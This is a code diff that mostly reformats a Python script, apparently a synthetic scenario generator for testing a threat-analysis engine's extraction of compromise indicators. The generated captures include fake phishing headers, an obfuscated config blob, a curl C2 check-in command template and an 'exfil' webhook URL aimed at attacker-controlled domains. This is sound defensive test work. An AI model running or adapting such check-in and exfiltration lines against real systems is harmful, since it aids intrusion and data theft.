@@ -68,7 +68,9 @@ def _rfc5737_ip(rng: random.Random, block: str) -> str:
 
 def _hostname_burner(rng: random.Random) -> str:
     prefix = _pick(rng, ["DESKTOP", "LAPTOP", "WIN"])
-    suffix = "".join(rng.choice(string.ascii_uppercase + string.digits) for _ in range(7))
+    suffix = "".join(
+        rng.choice(string.ascii_uppercase + string.digits) for _ in range(7)
+    )
     return f"{prefix}-{suffix}"
 
 
@@ -94,7 +96,9 @@ def build_hard_payload_b64(variant: ScenarioVariant, rng: random.Random) -> str:
 
     # Synthetic, reserved, safe indicators.
     public_ip = _rfc5737_ip(rng, "203.0.113")
-    internal_ip = f"10.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}"
+    internal_ip = (
+        f"10.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"
+    )
     url = f"https://{variant.c2_domain}/api/v1/collect?src=hard&rid={rng.randint(10000, 99999)}"
 
     encoded_url = urllib.parse.quote(url, safe="")
@@ -123,10 +127,12 @@ def build_hard_payload_b64(variant: ScenarioVariant, rng: random.Random) -> str:
         "burner": variant.burner_hostname or "none",
         "operator": variant.attacker_handle,
     }
-    inner_gz_json = gzip.compress(json.dumps(inner_cfg, separators=(",", ":")).encode("utf-8"))
-    blob_gzjson_b64 = _wrap_base64_lines(base64.b64encode(inner_gz_json).decode("ascii")).encode(
-        "ascii"
+    inner_gz_json = gzip.compress(
+        json.dumps(inner_cfg, separators=(",", ":")).encode("utf-8")
     )
+    blob_gzjson_b64 = _wrap_base64_lines(
+        base64.b64encode(inner_gz_json).decode("ascii")
+    ).encode("ascii")
 
     xor_key = rng.choice([0xAA, 0x5A, 0xCC])
     xor_plain = (
@@ -320,14 +326,18 @@ def build_payload_text(variant: ScenarioVariant, rng: random.Random) -> str:
 
     vm_line = f"vm_hint={variant.vm_platform}\n" if variant.vm_platform else ""
     ghost_line = (
-        f"ghost_device={variant.ghost_device_hint}\n" if variant.used_ghost_device else ""
+        f"ghost_device={variant.ghost_device_hint}\n"
+        if variant.used_ghost_device
+        else ""
     )
     host_line = (
         f"hostname={variant.burner_hostname}\n" if variant.burner_hostname else ""
     )
 
     # Include both public & private IPs to exercise IOC classification.
-    internal_ip = f"10.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}"
+    internal_ip = (
+        f"10.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"
+    )
 
     text = f"""# Synthetic Incident Capture (Fictional)
 # Scenario: careless newbie attacker targeting a local bank brand (example-only)
@@ -338,7 +348,7 @@ def build_payload_text(variant: ScenarioVariant, rng: random.Random) -> str:
 === PHISH EMAIL HEADERS (synthetic) ===
 From: \"IT Helpdesk\" <helpdesk@localbank.example>
 Reply-To: {variant.contact_email}
-Message-ID: <{campaign}.{rng.randint(100000,999999)}@localbank.example>
+Message-ID: <{campaign}.{rng.randint(100000, 999999)}@localbank.example>
 Received: from smtp.localbank.example ({variant.exit_ip}) by mx.localbank.example; Fri, 20 Dec 2025 10:15:12 {variant.timezone_hint}
 X-Originating-IP: [{variant.home_ip}]
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Thunderbird/115.6
@@ -349,7 +359,7 @@ https://portal.localbank.example/quota/report?id={campaign}
 
 === OPERATOR COMMAND (synthetic) ===
 # attacker runs quick-and-dirty tooling and forgets to scrub headers
-curl -s https://{variant.c2_domain}/v2/checkin?id={campaign}&host={variant.burner_hostname or 'UNKNOWN'}&tz={variant.timezone_hint} \\
+curl -s https://{variant.c2_domain}/v2/checkin?id={campaign}&host={variant.burner_hostname or "UNKNOWN"}&tz={variant.timezone_hint} \\
   -H \"User-Agent: {variant.user_agent}\" \\
   -H \"X-Debug: true\" \\
   -H \"X-Operator: {variant.attacker_handle}\" \\
@@ -373,9 +383,9 @@ X-Forwarded-For: {variant.home_ip}
 CF-Connecting-IP: {variant.exit_ip}
 
 === DATA SNIPPET (synthetic, not real PII) ===
-customer_id=EXAMPLE-{rng.randint(100000,999999)}
-account_masked=XXXX-XXXX-XXXX-{rng.randint(1000,9999)}
-amount={rng.randint(10,9000)}.{rng.randint(0,99):02d}
+customer_id=EXAMPLE-{rng.randint(100000, 999999)}
+account_masked=XXXX-XXXX-XXXX-{rng.randint(1000, 9999)}
+amount={rng.randint(10, 9000)}.{rng.randint(0, 99):02d}
 file_sha256={fake_hash}
 
 === CONFIG LEAK (base64(gzip(json))) ===
@@ -385,20 +395,22 @@ CONFIG_B64_GZ={config_blob}
 ssh_banner=OpenSSH_9.6p1 Debian-1
 os={variant.os_hint}
 locale={variant.locale_hint}
-build_host=synthetic-build-{_pick(rng, ['laptop', 'vm', 'desktop'])}
+build_host=synthetic-build-{_pick(rng, ["laptop", "vm", "desktop"])}
 {vm_line}{ghost_line}{host_line}timezone={variant.timezone_hint}
-vpn={'enabled' if variant.used_vpn else 'disabled'}
-vpn_provider={variant.vpn_provider or 'none'}
-vpn_protocol={variant.vpn_protocol or 'none'}
-note={'VPN tunnel active; forgot to strip X-Forwarded-For' if variant.used_vpn else 'No VPN used; home IP leaked in headers'}
-exfil=https://{variant.drop_domain}/api/webhooks/{rng.randint(10**17,10**18-1)}/{_rand_hex(rng, 16)}
+vpn={"enabled" if variant.used_vpn else "disabled"}
+vpn_provider={variant.vpn_provider or "none"}
+vpn_protocol={variant.vpn_protocol or "none"}
+note={"VPN tunnel active; forgot to strip X-Forwarded-For" if variant.used_vpn else "No VPN used; home IP leaked in headers"}
+exfil=https://{variant.drop_domain}/api/webhooks/{rng.randint(10**17, 10**18 - 1)}/{_rand_hex(rng, 16)}
 contact_email={variant.contact_email}
 """
 
     return text
 
 
-def _ioc_leads_from_report(report: Dict[str, Any], forensics: Dict[str, Any]) -> Dict[str, Any]:
+def _ioc_leads_from_report(
+    report: Dict[str, Any], forensics: Dict[str, Any]
+) -> Dict[str, Any]:
     iocs = report.get("iocs", {}) or {}
     leads: List[Dict[str, Any]] = []
 
@@ -478,7 +490,9 @@ def _ioc_leads_from_report(report: Dict[str, Any], forensics: Dict[str, Any]) ->
     }
 
 
-def run_iteration(engine: TitanEngine, forensics_engine: ForensicsEngine, payload: bytes) -> Tuple[Dict[str, Any], Dict[str, Any], float]:
+def run_iteration(
+    engine: TitanEngine, forensics_engine: ForensicsEngine, payload: bytes
+) -> Tuple[Dict[str, Any], Dict[str, Any], float]:
     start = time.perf_counter()
     report = engine.run_analysis(payload)
     elapsed = time.perf_counter() - start
@@ -487,11 +501,15 @@ def run_iteration(engine: TitanEngine, forensics_engine: ForensicsEngine, payloa
 
 
 def main() -> int:
-    parser = argparse.ArgumentParser(description="Titan synthetic stress scenario runner")
+    parser = argparse.ArgumentParser(
+        description="Titan synthetic stress scenario runner"
+    )
     parser.add_argument("--iterations", type=int, default=50)
     parser.add_argument("--seed", type=int, default=1337)
     parser.add_argument("--profile", choices=["fast", "full"], default="full")
-    parser.add_argument("--out-dir", type=Path, default=Path("/tmp/titan_stress_export"))
+    parser.add_argument(
+        "--out-dir", type=Path, default=Path("/tmp/titan_stress_export")
+    )
     parser.add_argument("--difficulty", choices=["easy", "hard"], default="easy")
     args = parser.parse_args()
 
